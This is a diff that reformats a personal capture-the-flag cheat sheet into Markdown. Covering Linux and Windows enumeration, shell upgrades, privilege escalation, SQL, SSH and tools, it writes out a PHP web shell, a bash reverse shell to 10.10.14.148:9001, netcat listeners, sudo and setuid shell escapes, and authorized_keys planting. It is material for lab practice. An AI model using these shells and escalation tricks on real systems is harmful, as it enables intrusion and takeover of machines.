@@ -1,41 +1,62 @@
-<h1>CTF Notes</h1>
+#CTF Notes
 
-***Linux
+##Linux
 
 Website for searching for shells through random programs such as 'vi' "living off the land binaries": https://gtfobins.github.io/ 
 Raw memory location so no files on disk: /dev/shm/
 
-Enumeration
-find files user has access to: find / -user <username> -ls 2>/dev/null
+###Enumeration
+
+find files user has access to: 
+> find / -user <username> -ls 2>/dev/null
+
 full linux enumeration: LinEnum.py from github #This is very helpful!! /// Also LinPEAS
-Locate exploits: searchsploit <name_of_program> # -x then name of exploit to pull up that info
+Locate exploits: 
+> searchsploit <name_of_program> # -x then name/number of exploit to pull up code
+
 enumerate running processes: pspy
 enumeration multi-tool: Sparta (does nmap, hydra, nikto, sqlscan, ssl...)
 http://bastille-linux.sourceforge.net/assessment.htm
 enumerate info about current process running from: /proc/self/status
 https://github.com/tennc/fuzzdb/tree/master/dict/BURP-PayLoad/LFI
 
-upgrade shells:
+###Upgrade shells:
+
+```
 1. [user@localhost]$ sudo python -c 'import pty; pty.spawn("/bin/sh")'
 2. [user@localhost]$ sudo perl -e 'exec "/bin/sh";'
 3. [user@localhost]$ sudo ruby -e 'exec "/bin/sh"'
+```
 
-php shell: <?php system($_GET['variable_name']); ?>
-bash reverse shell: bash -i >& /dev/tct/10.10.14.148/9001 0>&1 /// URL encoded: bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
-nc listener: nc -lvnp 9001
-python shell:   python -c 'import pty;pty.spawn("/bin/bash")'; #for interactive shell
+php shell: 
+> <?php system($_GET['variable_name']); ?>
+bash reverse shell: 
+> bash -i >& /dev/tct/10.10.14.148/9001 0>&1
+URL encoded: 
+> bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
+
+nc listener: 
+>nc -lvnp 9001
+
+python shell:   
+```
+python -c 'import pty;pty.spawn("/bin/bash")'; #for interactive shell
 ^[ctrl-z to background]; stty raw -echo; #after python shell for full interactive
 ^export TERM=xterm #use after ^ to allow to clear screen in remote shell...
+```
 
-TMUX
-tmux can keep alive sessions if lose ssh etc, split panes: tmux new -s <session_name>
-^ ctrl-b =prefix key (addnl commands) +[%]vertical  or + ["]horizontal to split windows +[arrow_keys] move between panes +[z] zoom in/out on pane +[?] help for tmux +[t] timer
-^tmux logging plugin (get this!!) can save log of tmux windows
-^alt-[.] cycle through previous arguments
-^ctrl-[arrow_keys] move between "words" on a command line
+###TMUX
+tmux can keep alive sessions if lose ssh etc, split panes: 
+```
+tmux new -s <session_name>
+**ctrl-b** = prefix key (addnl commands) +[%]vertical  or + ["]horizontal to split windows +[arrow_keys] move between panes +[z] zoom in/out on pane +[?] help for tmux +[t] timer
+tmux logging plugin (get this!!) can save log of tmux windows
+alt-[.] cycle through previous arguments
+ctrl-[arrow_keys] move between "words" on a command line
+````
 https://github.com/NHDaly/tmux-better-mouse-mode
 
-Privilege Escalation
+**Privilege Escalation**
 execute command as another user; sudo -u <username> [command]
 execute any command: while in less [!]
 Privilege Escalation to Root: chmod 47555 /bin/less
@@ -58,11 +79,12 @@ mawk 'BEGIN {system("/bin/sh")}'
 3. [root@localhost]#
 Note: for this method to work, the attacker has to read a file that is longer than one page
 
+
+
+###Misc Linux
 list all running commands: ps -eo command
 ^change delimiter to \n instead of [space] (loop by line): IFS=$'\n'
 ^loop through each line in output: for i in $(ps -eo command); do echo $i; done
-
-Misc Linux
 'new' netstat: ss -lnp | grep 9001 #check if any connections on port 9001
 get user permissions: sudo -l #github linenum
 copy files to local machine: base64 -w 0 /path/of/file/name.file #copy base64 then: echo -n <base64material> | base64 -d > filename.file
@@ -71,7 +93,7 @@ wfuzz
 convert rpm to debian packages: alien <file.rpm>
 Makes PWD part of path so dont need './' [NOT RECOMMENDED!]: export PATH='pwd':$PATH
 
-***Windows
+##Windows
 
 https://lolbas-project.github.io/ - living off the land binaries
 
@@ -92,7 +114,7 @@ check what updates are installed: type WindowsUpdate.log
 
 net use share from linux [like SimpleHTTPServer for Samba]: impacket-smbserver <sharename> '<dir_to_share>'
 
-***MISC
+##Miscelaneous
 
 Encryption/Decryption
 https://gchq.github.io/CyberChef/
@@ -107,7 +129,7 @@ generate password for insertion into /etc/passwd: openssl passwd -l (1?) -salt <
 Hashes.org: large database of pre-cracked hashes
 password lists: https://wiki.skullsecurity.org/Passwords
 
-Binary Exploitation
+###Binary Exploitation
 gdb plugin for exploits/creates patterns for ROP determination: peda.py/pwndbg [gdb: pattern create ###]
 ASLR Bypass/binary exploit/gdb: Ippsec:HackTheBox - October /// Ippsec:Camp CTF - Bitterman [pwnTools]
 Binary Ninja
@@ -115,7 +137,7 @@ Packetstorm /bin/sh shellcode
 simple binary exploitation [Ippsec:HacktheBox - Sneaky]
 protostar ctf for getting into binary exploitation
 
-HTTP
+###HTTP
 in order to proxy tools that have no proxy option: create burn proxy 127.0.0.1:80 [Ippsec:HacktheBox - Granny & Grandpa]
 vulnerability testing for webdav (or other file upload vulns!): davtest
 bypassing filetype filters with http MOVE command to rename allowed filetype [Ippsec:HacktheBox - Granny & Grandpa]
@@ -125,21 +147,21 @@ virtual host routing: substitute ip for hostname to get different results
 gobuster -u <url> -l -w <wordlist> -x php -t 20 [-l include length, -x append .php to searches, -t threads]
 hydra against http wordpress login walkthrough [IppSec:HacktheBox - Apocalyst]
 
-SQL
+###SQL
 blind sql injection UNIoN queries [Ippsec:HacktheBox - Charon] use CONCAT("x","x")
 get shell in mysql: \! /bin/sh
 https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
 
-DNS
+###DNS
 DNS reverse lookup recon: dnsrecon -r <ip/subnet[127.0.0.0/24]> -n <ip_to_check>
 DNS zone transfer: dig axfr <hostname> @<ip>
 add DNS server: /etc/resolv.conf {nameserver <ip>}
 add Hosts: /etc/hosts
 
-Steganography
+###Steganography
 extract files from stego'd files: binwalk -Me <filename>
 
-SSH
+###SSH
 generate ssh key for access: ssh-keygen -f <filename>; cat <filename>; 
 ^ #copy to remote host; echo <copied_key> > ./.ssh/authorized_keys
 ^use generated key to ssh remote: chmod 600 <filename>; ssh -i <filename> <remotehost>
@@ -152,7 +174,7 @@ ssh 127.0.0.1 /bin/dash
 Use bash with command options to disable processing startup files:
 ssh 127.0.0.1 "bash --noprofile --norc"
 
-Unsorted
+###Unsorted
 shortcut for all ports: nmap -p-
 Firefox Browser plugins:Tampermonkey (userscript manager); Cookie Manager+; 
 signing APK files: IppSec:HHC2016 - Debug
@@ -168,7 +190,7 @@ Hurricane Electric ISP - http://he.net/ [Ippsec uses with IPv6 as a psuedo-VPN]
 IPv6 primer [Ippsec:HacktheBox - Sneaky] fe80::/10 - febf:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Link Local 169.254.x.x APIPA (built from MAC address on Linux, 7th bit flips, adds ff:fe in the center)/// fc00::/7 - fdff:ffff:ffff:ffff:ffff:ffff:ffff:ffff Unique Local Unicast 10.x.x.x, 172.16.x.x, 192.168.x.x /// 2000::/3 - Global Unicast routable /// ff02::1 - Multicast All Nodes /// ff02::2 Multicast ROUTER nodes
 ip6tables - iptables for ipv6
 
-***Write-ups
+##Write-ups
 
 https://medium.com/bugbountywriteup
 https://cowsayroot.com/
@@ -178,7 +200,7 @@ https://resources.infosecinstitute.com/tools-of-trade-and-resources-to-prepare-i
 https://www.reddit.com/r/hackthebox/
 https://mzfr.github.io/vulnhub-writeups/
 
-***CTF Tools & Cheatsheets
+##CTF Tools & Cheatsheets
 
 https://github.com/Ganapati/RsaCtfTool <-- RSA cracking tools //uncipher data from weak public key and try to recover private key
 https://www.capturetheflags.com/tools-for-ctf/   <--Has both linux and windows
